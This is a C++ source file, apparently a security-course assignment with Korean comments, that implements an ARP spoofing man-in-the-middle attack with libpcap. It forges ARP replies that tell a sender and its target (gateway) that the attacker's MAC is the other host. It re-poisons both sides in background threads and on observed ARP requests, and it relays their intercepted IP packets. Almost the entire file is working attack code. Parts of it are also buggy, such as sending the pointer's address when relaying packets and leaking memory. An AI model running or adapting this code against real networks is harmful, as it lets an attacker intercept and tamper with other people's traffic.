#include "arp_spoof.h"

EthArpPacket gen_arp_req(Mac smac_, Ip sip_, Ip tip_)
{
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac(Mac::broadcastMac());
    packet.eth_.smac_ = Mac(smac_);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(smac_);
    packet.arp_.sip_ = htonl(sip_);
    packet.arp_.tmac_ = Mac(Mac::nullMac());
    packet.arp_.tip_ = htonl(tip_);

    return packet;
}

EthArpPacket gen_arp_reply(Mac smac_, Mac tmac_, Ip sip_, Ip tip_)
{
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac(tmac_);
    packet.eth_.smac_ = Mac(smac_);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(smac_);
    packet.arp_.sip_ = htonl(sip_);
    packet.arp_.tmac_ = Mac(tmac_);
    packet.arp_.tip_ = htonl(tip_);

    return packet;
}

// 패킷을 입력받아 원하는 arp reply인지 확인
Mac get_arp_reply_mac(const u_char *packet, Mac dmac_, Ip sip_, Ip tip_)
{
    EthArpPacket *ethArpPacket = (EthArpPacket *)malloc(sizeof(EthArpPacket));

    ethArpPacket = (EthArpPacket *)packet;

    if ((ethArpPacket->eth_.type()) != EthHdr::Arp ||
        ethArpPacket->eth_.dmac() != dmac_ ||
        ethArpPacket->arp_.op() != ArpHdr::Reply)
        return Mac::broadcastMac();

    if (ethArpPacket->arp_.sip() == sip_ &&
        ethArpPacket->arp_.tip() == tip_)
    {
        return Mac(ethArpPacket->arp_.smac_);
    }
    else
        return Mac::broadcastMac();
}

// arp request를 보내고 get_arp_reply_mac()에서 원하는 reply인지 확인
Mac get_mac_via_arp(pcap_t *pcap, Mac myMac, Ip myIp, Ip tip_)
{
    EthArpPacket packet = gen_arp_req(myMac, myIp, tip_);
    Mac smac;

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }

    int count = 1;
    while (true)
    {
        if (count++ % 10 == 0)
            pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));

        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        smac = get_arp_reply_mac(packet, myMac, tip_, myIp);

        if (smac != Mac::broadcastMac())
            break;
    }

    return smac;
}

int send_arp_reply(pcap_t *pcap, EthArpPacket packet)
{
    for (int i = 0; i < 3; i++)
    {
        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
        if (res != 0)
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
    printf("sending arp reply... \n");
    return 1;
}

void *t_send_arp_replys(void *argv)
{
    ArpTArgs *arpTArgs = (ArpTArgs *)argv;
    ArpReqs arpReqs = arpTArgs->arpReqs_;
    EthArpPacket packet = gen_arp_reply(arpReqs.smac_, arpReqs.tmac_, arpReqs.sip_, arpReqs.tip_);

    int i = 0;
    while (true)
    {
        i++;
        send_arp_reply(arpTArgs->pcap_, packet);
        printf("----[sending arp reply [%d]]----\n", i);
        printf("smac : %s \n", std::string(packet.arp_.smac()).c_str());
        printf("tmac : %s \n", std::string(packet.arp_.tmac()).c_str());
        printf("sip : %s \n", std::string(packet.arp_.sip()).c_str());
        printf("tip : %s \n", std::string(packet.arp_.tip()).c_str());
        printf("---------------------------\n");
        sleep(3);
    }

    pthread_exit(NULL);
}

int arp_reply_to_req(pcap_t *pcap, const u_char *packet, ArpSpoofReqs arpSpoofReqs, EthArpPacket ethArpPacket_s, EthArpPacket ethArpPacket_t)
{
    ArpReqs arpReqs = arpSpoofReqs.arpReqs_;
    EthArpPacket *ethArpPacket = (EthArpPacket *)malloc(sizeof(EthArpPacket));

    send_arp_reply(pcap, ethArpPacket_t);

    ethArpPacket = (EthArpPacket *)packet;

    if (ethArpPacket->arp_.sip() == arpReqs.sip_ && ethArpPacket->arp_.tip() == arpReqs.tip_ && ethArpPacket->arp_.op() == ArpHdr::Request)
        send_arp_reply(pcap, ethArpPacket_s);

    if (ethArpPacket->arp_.sip() == arpReqs.tip_ && ethArpPacket->arp_.tip() == arpReqs.sip_ && ethArpPacket->arp_.op() == ArpHdr::Request)
        send_arp_reply(pcap, ethArpPacket_t);
}

int relay_ip_packet(pcap_t *pcap, const u_char *packet, ArpSpoofReqs arpSpoofReqs, bpf_u_int32 len)
{
    ArpReqs arpReqs = arpSpoofReqs.arpReqs_;

    EthHdr *ethHdr;
    ethHdr = (EthHdr *)packet;

    if (ethHdr->dmac_ != arpSpoofReqs.myMac_)
        return -1;

    printf("test1 %s %s\n", std::string(ethHdr->dmac()).c_str(), std::string(arpReqs.smac_).c_str());
    // sender에서 target으로 보내는 패킷. 감염되어 공격자에게 오는 중 ~

    if (ethHdr->smac_ == arpReqs.smac_)
        ethHdr->dmac_ = arpReqs.tmac_;
    else if (ethHdr->smac_ == arpReqs.tmac_)
        ethHdr->dmac_ = arpReqs.smac_;

    ethHdr->smac_ = arpSpoofReqs.myMac_;

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), len);
    if (res != 0)
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));

    printf("ip packet detected\n");
    printf("ip packet detected\n");
}

int arp_spoof(ArpSpoofReqs arpSpoofReqs)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(arpSpoofReqs.interface_, BUFSIZ, 1, 1000, errbuf); // BUFSIZ 8192
    if (pcap == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", arpSpoofReqs.interface_, errbuf);
        return -1;
    }

    // 상대 Mac 알아오기
    ArpReqs arpReqs = arpSpoofReqs.arpReqs_;
    arpReqs.smac_ = get_mac_via_arp(pcap, arpSpoofReqs.myMac_, arpSpoofReqs.myIp_, arpReqs.sip_);
    arpReqs.tmac_ = get_mac_via_arp(pcap, arpSpoofReqs.myMac_, arpSpoofReqs.myIp_, arpReqs.tip_);
    printf("sender mac: %s\n", std::string(arpReqs.smac_).c_str());
    printf("target mac: %s\n", std::string(arpReqs.tmac_).c_str());
    arpSpoofReqs.arpReqs_ = arpReqs;

    // arp reply 보내기
    EthArpPacket ethArpPacket_t = gen_arp_reply(arpSpoofReqs.myMac_, arpReqs.tmac_, arpReqs.sip_, arpReqs.tip_); // target에게 내가 sender라고 속임
    EthArpPacket ethArpPacket_s = gen_arp_reply(arpSpoofReqs.myMac_, arpReqs.smac_, arpReqs.tip_, arpReqs.sip_); // sender에게 내가 target(gateway)라고 속임
    send_arp_reply(pcap, ethArpPacket_t);
    send_arp_reply(pcap, ethArpPacket_s);

    ArpTArgs *arpTArgs_s = (ArpTArgs *)malloc(sizeof(ArpTArgs));
    arpTArgs_s->pcap_ = pcap;
    arpTArgs_s->arpReqs_ = ArpReqs(arpSpoofReqs.myMac_, arpReqs.smac_, arpReqs.tip_, arpReqs.sip_);
    ArpTArgs *arpTArgs_t = (ArpTArgs *)malloc(sizeof(ArpTArgs));
    arpTArgs_t->pcap_ = pcap;
    arpTArgs_t->arpReqs_ = ArpReqs(arpSpoofReqs.myMac_, arpReqs.tmac_, arpReqs.sip_, arpReqs.tip_);

    int thr_id[2];
    pthread_t pthread[2];
    thr_id[0] = pthread_create(&pthread[0], NULL, t_send_arp_replys, (void *)arpTArgs_s);
    sleep(1);
    thr_id[1] = pthread_create(&pthread[1], NULL, t_send_arp_replys, (void *)arpTArgs_t);

    // 감염
    // 이제 arp request 패킷을 탐지하면서 적절하게 재감염 시킬 것.
    EthHdr *ethHdr = (EthHdr *)malloc(sizeof(EthHdr));
    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;

        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        ethHdr = (EthHdr *)packet;

        if (ethHdr->type() == EthHdr::Arp)
            arp_reply_to_req(pcap, packet, arpSpoofReqs, ethArpPacket_s, ethArpPacket_t);
        else if (ethHdr->type() == EthHdr::Ip4)
            relay_ip_packet(pcap, packet, arpSpoofReqs, header->caplen);
    }

    int status;
    for (int i = 0; i < 2; i++)
        pthread_join(pthread[i], (void **)&status);

    pcap_close(pcap);
}

void *t_arp_spoof(void *argv)
{
    ArpSpoofReqs *arpSpoofReqs_t = (ArpSpoofReqs *)argv;
    arp_spoof(*arpSpoofReqs_t);

    pthread_exit(NULL);
}
